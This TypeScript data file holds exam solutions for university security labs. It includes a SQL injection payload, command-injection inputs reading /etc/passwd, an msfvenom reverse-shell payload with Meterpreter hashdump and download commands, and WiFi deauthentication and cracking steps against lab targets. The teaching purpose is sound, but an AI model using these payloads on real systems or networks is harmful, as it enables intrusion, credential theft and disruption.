/**
 * Practical exam solutions for TechSec QOU courses.
 * Content authored by Eng. Duha Twam (Al-Quds Open University).
 * Pure data — no video, structured for clear academic display.
 */

export interface ExamCommand {
  cmd: string;
  desc?: string;
}

export interface ExamBlock {
  type: "paragraph" | "list" | "commands" | "table" | "note" | "warning";
  text?: string;
  items?: string[];
  commands?: ExamCommand[];
  /** Table: first row = header */
  rows?: string[][];
}

export interface ExamSubsection {
  title: string;
  blocks: ExamBlock[];
}

export interface ExamSection {
  id: string;
  number: string;
  title: string;
  intro?: string;
  subsections: ExamSubsection[];
}

export interface PracticalExam {
  courseId: string;
  courseTitle: string;
  courseTitleAr: string;
  examTitle: string;
  examTitleAr: string;
  author: string;
  university: string;
  sections: ExamSection[];
}

/* ============================================================
   1) Information Security Software & Applications — 1272
   ============================================================ */
export const infosecExam: PracticalExam = {
  courseId: "infosec-1272",
  courseTitle: "Information Security Software and Applications",
  courseTitleAr: "برمجيات وتطبيقات أمن المعلومات",
  examTitle: "Practical Exam Solution — InfoSec 1272",
  examTitleAr: "حل الامتحان العملي — برمجيات وتطبيقات أمن المعلومات 1272",
  author: "Eng. Duha Twam · المهندسة ضحى توام",
  university: "Al-Quds Open University · جامعة القدس المفتوحة",
  sections: [
    {
      id: "q1-recon",
      number: "Q1",
      title: "Reconnaissance Phase — مرحلة الاستطلاع",
      intro:
        "جمع معلومات علنية عن الهدف باستخدام أدوات استطلاع سلبي لا تترك أثراً في سجلات الهدف.",
      subsections: [
        {
          title: "1) whois — معلومات تسجيل النطاق",
          blocks: [
            { type: "commands", commands: [{ cmd: "whois google.com" }] },
            {
              type: "list",
              items: [
                "Registrar: MarkMonitor Inc.",
                "تاريخ إنشاء النطاق: 1997-09-15 — تاريخ الانتهاء: 2028-09-14",
                "Name Servers: NS1–NS4.GOOGLE.COM",
                "Domain Status: clientDeleteProhibited, clientTransferProhibited …",
              ],
            },
            {
              type: "note",
              text: "تصنيف: استطلاع سلبي (Passive Reconnaissance) — لا تفاعل مباشر مع أنظمة الهدف.",
            },
          ],
        },
        {
          title: "2) dig — استعلام DNS مباشر",
          blocks: [
            { type: "commands", commands: [{ cmd: "dig google.com" }] },
            {
              type: "list",
              items: [
                "A Record: 142.250.75.206",
                "Status: NOERROR — Query time: 7 ms",
                "DNS server: 192.168.112.2",
              ],
            },
          ],
        },
        {
          title: "3) dnsrecon — جرد شامل لسجلات DNS",
          blocks: [
            { type: "commands", commands: [{ cmd: "dnsrecon -d google.com" }] },
            {
              type: "list",
              items: [
                "SOA: ns1.google.com",
                "NS: ns1–ns4.google.com",
                "MX: smtp.google.com",
                "A / AAAA / TXT (مثل _dmarc.google.com)",
              ],
            },
          ],
        },
        {
          title: "4) traceroute — رسم مسار الشبكة",
          blocks: [
            { type: "commands", commands: [{ cmd: "traceroute google.com" }] },
            {
              type: "list",
              items: [
                "Hop 1: 192.168.112.2 (البوابة المحلية)",
                "Hops 2+: نجوم * — جدران نارية تخفي البنية التحتية",
              ],
            },
          ],
        },
        {
          title: "5) host — استعلام DNS مختصر",
          blocks: [
            { type: "commands", commands: [{ cmd: "host google.com" }] },
            {
              type: "list",
              items: [
                "IPv4: 142.250.75.206",
                "IPv6: 2a00:1450:4028:80b::200e",
                "MX: 10 smtp.google.com",
                "HTTP service bindings: alpn=\"h2,h3\"",
              ],
            },
          ],
        },
        {
          title: "6) Reverse DNS Lookup",
          blocks: [
            {
              type: "commands",
              commands: [
                { cmd: "whois 8.8.8.8" },
                { cmd: "dig -x 8.8.8.8" },
                { cmd: "host 8.8.8.8" },
                { cmd: "traceroute 8.8.8.8" },
              ],
            },
            {
              type: "note",
              text: "PTR → dns.google يؤكد أن العنوان 8.8.8.8 يعود فعلياً لخدمة Google DNS.",
            },
          ],
        },
      ],
    },
    {
      id: "q2-vuln",
      number: "Q2",
      title: "Vulnerability Discovery — اكتشاف الثغرات",
      intro: "فحص شامل للهدف Metasploitable باستخدام Nmap لاكتشاف الخدمات والثغرات.",
      subsections: [
        {
          title: "Nmap Full Scan",
          blocks: [
            { type: "commands", commands: [{ cmd: "nmap -sV -O -p- 192.168.44.129", desc: "فحص جميع المنافذ + الإصدارات + نظام التشغيل" }] },
            {
              type: "table",
              rows: [
                ["Port", "Service", "Version / Note"],
                ["21", "FTP", "vsftpd 2.3.4 (باب خلفي معروف)"],
                ["22", "SSH", "OpenSSH 4.7p1"],
                ["23", "Telnet", "Linux telnetd (غير مشفر)"],
                ["80 / 8180", "HTTP", "Apache 2.2.8 / Tomcat"],
                ["3306", "MySQL", "5.0.51a"],
                ["5432", "PostgreSQL", "8.3.0"],
                ["5900", "VNC", "Protocol 3.3"],
                ["1524", "Bindshell", "Metasploitable root shell"],
              ],
            },
            {
              type: "note",
              text: "نظام التشغيل: Linux 2.6.9 – 2.6.33 — سطح هجوم واسع.",
            },
          ],
        },
      ],
    },
    {
      id: "q3-exploit",
      number: "Q3",
      title: "Exploitation — مرحلة الاستغلال",
      subsections: [
        {
          title: "Part 1 · SQL Injection (Union-Based) على DVWA",
          blocks: [
            {
              type: "commands",
              commands: [
                { cmd: "1' UNION SELECT user, password FROM users-- -", desc: "استخراج بيانات المستخدمين" },
              ],
            },
            {
              type: "list",
              items: [
                "نوع الثغرة: SQL Injection (Union-Based)",
                "تخزين كلمات المرور بـ MD5 بدون Salt — قابل للكسر بسهولة",
                "تأثير مباشر: تجاوز المصادقة وتسريب بيانات حساسة",
              ],
            },
          ],
        },
        {
          title: "Part 2 · Command Injection",
          blocks: [
            {
              type: "commands",
              commands: [
                { cmd: "127.0.0.1; whoami", desc: "إثبات تنفيذ أمر إضافي" },
                { cmd: "127.0.0.1; ls", desc: "عرض محتويات المجلد على الخادم" },
                { cmd: "127.0.0.1; cat /etc/passwd", desc: "قراءة ملف نظام حساس" },
                { cmd: "127.0.0.1; id", desc: "هوية المستخدم → www-data (uid=33)" },
                { cmd: "127.0.0.1; mkdir test_folder", desc: "كتابة على نظام الملفات" },
                { cmd: "127.0.0.1; ls -la", desc: "تأكيد إنشاء المجلد" },
              ],
            },
            {
              type: "warning",
              text: "ثغرة Remote Code Execution تسمح بالقراءة والكتابة — يمكن لاحقاً رفع ملفات خبيثة وإنشاء أبواب خلفية.",
            },
          ],
        },
      ],
    },
    {
      id: "q4-post",
      number: "Q4",
      title: "Exploitation & Post-Exploitation Plan — خطة الاستغلال وما بعده",
      subsections: [
        {
          title: "المصطلحات الأساسية",
          blocks: [
            {
              type: "list",
              items: [
                "Payload — كود يُنفَّذ على الجهاز المستهدف لفتح اتصال عكسي.",
                "Shell — واجهة أوامر تفاعلية على الجهاز المستهدف.",
                "Listener / Handler — يعمل على Kali وينتظر الاتصال الوارد.",
                "Session — قناة اتصال نشطة بعد نجاح الاستغلال.",
              ],
            },
          ],
        },
        {
          title: "خطة الأوامر بالترتيب",
          blocks: [
            {
              type: "table",
              rows: [
                ["#", "المرحلة", "الأمر"],
                ["1", "إنشاء الحمولة", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe > payload.exe"],
                ["2", "تشغيل الإطار", "msfconsole"],
                ["3", "اختيار المعالج", "use exploit/multi/handler"],
                ["4", "ضبط الحمولة", "set payload windows/meterpreter/reverse_tcp"],
                ["5", "ضبط IP", "set LHOST <KALI_IP>"],
                ["6", "ضبط المنفذ", "set LPORT 4444"],
                ["7", "بدء الاستماع", "exploit"],
              ],
            },
          ],
        },
        {
          title: "أوامر ما بعد الاستغلال (Meterpreter)",
          blocks: [
            {
              type: "commands",
              commands: [
                { cmd: "ls", desc: "استعراض الملفات" },
                { cmd: "sysinfo", desc: "معلومات نظام الضحية" },
                { cmd: "getuid", desc: "هوية المستخدم الحالي" },
                { cmd: "hashdump", desc: "استخراج هاشات كلمات المرور" },
                { cmd: "screenshot", desc: "التقاط شاشة الضحية" },
                { cmd: "download <file>", desc: "تنزيل ملف من الضحية" },
                { cmd: "upload <file>", desc: "رفع ملف إلى الضحية" },
                { cmd: "shell", desc: "الانتقال إلى Shell نظامي" },
              ],
            },
          ],
        },
      ],
    },
  ],
};

/* ============================================================
   2) Wireless Network Security — 1376
   ============================================================ */
export const wirelessExam: PracticalExam = {
  courseId: "wireless-1376",
  courseTitle: "Wireless Network Security",
  courseTitleAr: "أمن الشبكات اللاسلكية",
  examTitle: "Practical Exam Solution — Wireless 1376",
  examTitleAr: "حل الامتحان العملي — أمن الشبكات اللاسلكية 1376",
  author: "Eng. Duha Twam · المهندسة ضحى توام",
  university: "Al-Quds Open University · جامعة القدس المفتوحة",
  sections: [
    {
      id: "scan",
      number: "Q1",
      title: "Scanning Wireless Networks — مسح الشبكات اللاسلكية",
      intro: "نتيجة المسح تعرض الشبكات المحيطة وتفاصيل التشفير وقوة الإشارة.",
      subsections: [
        {
          title: "نتيجة Airodump-ng (مثال)",
          blocks: [
            {
              type: "table",
              rows: [
                ["BSSID", "PWR", "CH", "ENC", "CIPHER", "AUTH", "ESSID"],
                ["B4:0F:3B:C7", "-54", "11", "WPA2", "CCMP", "PSK", "<length: 0>"],
                ["50:0F:F5:DF", "-58", "4", "WPA2", "CCMP", "PSK", "<length: 0>"],
                ["50:0F:F5:E0", "-67", "6", "WPA2", "CCMP", "PSK", "JET"],
                ["60:32:B1:5A", "-50", "11", "WPA2", "CCMP", "PSK", "testyou"],
                ["CC:2D:21:E6", "-82", "8", "WPA2", "CCMP", "PSK", "JET_"],
              ],
            },
          ],
        },
        {
          title: "س1 — اسم الأداة والهدف",
          blocks: [
            { type: "paragraph", text: "الأداة: airodump-ng" },
            {
              type: "list",
              items: [
                "مسح الشبكات اللاسلكية المحيطة",
                "عرض BSSID و ESSID و Channel و Encryption",
                "مراقبة الأجهزة المتصلة + التقاط الحزم (Packet Sniffing)",
              ],
            },
          ],
        },
        {
          title: "س2 — مراقبة شبكة testyou تحديداً",
          blocks: [
            {
              type: "commands",
              commands: [
                {
                  cmd: "airodump-ng --bssid 60:32:B1:5A:CE:27 --channel 11 -w testyou wlan0mon",
                  desc: "تحديد BSSID والقناة وحفظ البيانات في ملف testyou",
                },
              ],
            },
          ],
        },
        {
          title: "س3 — التشفير والمصادقة لـ testyou",
          blocks: [
            {
              type: "list",
              items: [
                "Cipher: CCMP",
                "Authentication: PSK (Pre-Shared Key)",
                "Encryption: WPA2",
              ],
            },
          ],
        },
        {
          title: "س4 — معلومتان تقنيتان مفيدتان",
          blocks: [
            {
              type: "list",
              items: [
                "BSSID — عنوان MAC لنقطة الوصول، يُستخدم في هجمات MAC Spoofing",
                "PWR — قوة الإشارة، كلما اقتربت من الصفر دلّت على قرب الجهاز",
              ],
            },
          ],
        },
        {
          title: "س5 — هل توجد شبكات مخفية؟",
          blocks: [
            { type: "paragraph", text: "نعم — أي شبكة قيمة ESSID فيها <length: 0> فهي مخفية." },
            {
              type: "list",
              items: [
                "B4:0F:3B:C7 → ESSID <length: 0> (مخفية)",
                "50:0F:F5:DF → ESSID <length: 0> (مخفية)",
              ],
            },
          ],
        },
        {
          title: "س6 — ما معنى <length: 0>؟",
          blocks: [
            {
              type: "list",
              items: [
                "Hidden SSID — نقطة الوصول لا تبث الاسم في حزم Beacon.",
                "للكشف: تنفيذ Deauthentication Attack وانتظار إعادة اتصال العميل.",
                "عند الاتصال يظهر ESSID في حزم Association ونلتقطه.",
              ],
            },
          ],
        },
      ],
    },
    {
      id: "deauth",
      number: "Q2",
      title: "Deauthentication & MAC Spoofing — فصل الاتصال وانتحال العنوان",
      subsections: [
        {
          title: "س7 — حجب جهاز عن شبكة testyou",
          blocks: [
            {
              type: "commands",
              commands: [
                {
                  cmd: "aireplay-ng -0 600 -a 60:32:B1:5A:CE:27 -c 05:AB:89:B4:C8:ED wlan0mon",
                  desc: "إرسال 600 حزمة Deauth إلى جهاز محدد على الشبكة المستهدفة",
                },
              ],
            },
            {
              type: "list",
              items: [
                "-0 600 — عدد حزم الفصل",
                "-a — BSSID للشبكة المستهدفة",
                "-c — MAC للجهاز المراد فصله",
                "wlan0mon — الواجهة في وضع المراقبة",
              ],
            },
          ],
        },
        {
          title: "س8 — تغيير عنوان MAC",
          blocks: [
            { type: "paragraph", text: "الطريقة الأولى — ifconfig:" },
            {
              type: "commands",
              commands: [
                { cmd: "ifconfig wlan0 down" },
                { cmd: "ifconfig wlan0 hw ether A1:C2:E3:D4:F4:B5" },
                { cmd: "ifconfig wlan0 up" },
                { cmd: "ifconfig wlan0", desc: "تحقق من العنوان الجديد" },
              ],
            },
            { type: "paragraph", text: "الطريقة الثانية — macchanger:" },
            {
              type: "commands",
              commands: [
                { cmd: "ifconfig wlan0 down" },
                { cmd: "macchanger -m A1:C2:E3:D4:F4:B5 wlan0" },
                { cmd: "ifconfig wlan0 up" },
                { cmd: "macchanger -p wlan0", desc: "إعادة العنوان الأصلي" },
              ],
            },
          ],
        },
      ],
    },
    {
      id: "crack",
      number: "Q3",
      title: "Cracking with Aircrack-ng & Crunch — كسر كلمة المرور",
      subsections: [
        {
          title: "1) قراءة نتيجة Aircrack-ng",
          blocks: [
            {
              type: "list",
              items: [
                "الأداة: Aircrack-ng",
                "تم اكتشاف المفتاح: aaabb11",
                "السرعة: 9136.43 k/s — المدة: < ثانية",
              ],
            },
          ],
        },
        {
          title: "2) إنشاء قاموس بـ Crunch (≤ 2187 احتمال، اسم الملف duha)",
          blocks: [
            {
              type: "paragraph",
              text: "تحليل المفتاح aaabb11 — الطول 7، الأحرف 3 (a, b, 1) ⇒ 3⁷ = 2187 احتمال.",
            },
            {
              type: "commands",
              commands: [
                { cmd: "crunch 7 7 ab1 -o Desktop/duha.txt", desc: "توليد القاموس" },
                { cmd: "wc -l Desktop/duha.txt", desc: "النتيجة المتوقعة: 2187" },
              ],
            },
          ],
        },
        {
          title: "3) إثبات يدوي أن الملف يحتوي المفتاح",
          blocks: [
            {
              type: "commands",
              commands: [
                { cmd: 'grep "aaabb11" Desktop/duha.txt' },
                { cmd: "cat Desktop/duha.txt | grep aaabb11" },
                { cmd: 'grep -n "aaabb11" Desktop/duha.txt', desc: "مع رقم السطر" },
                { cmd: "less Desktop/duha.txt", desc: "ثم اكتب /aaabb11 للبحث داخل الملف" },
              ],
            },
          ],
        },
        {
          title: "4) القيود عند تعقيد كلمة المرور",
          blocks: [
            {
              type: "table",
              rows: [
                ["الطول", "الأحرف المحتملة", "الاحتمالات", "الوقت التقريبي"],
                ["8", "أرقام فقط", "100 مليون", "ساعات"],
                ["10", "أرقام + حروف", "839 مليار", "سنوات"],
                ["12+", "معقدة", "تريليونات", "غير عملي"],
              ],
            },
            {
              type: "warning",
              text: "النمو الأسي يجعل القواميس عملياً غير مجدية مع كلمات مرور طويلة ومعقدة + Salt.",
            },
          ],
        },
      ],
    },
  ],
};

export const allPracticalExams: PracticalExam[] = [infosecExam, wirelessExam];

export function getExamByCourseId(courseId: string): PracticalExam | undefined {
  return allPracticalExams.find((e) => e.courseId === courseId);
}
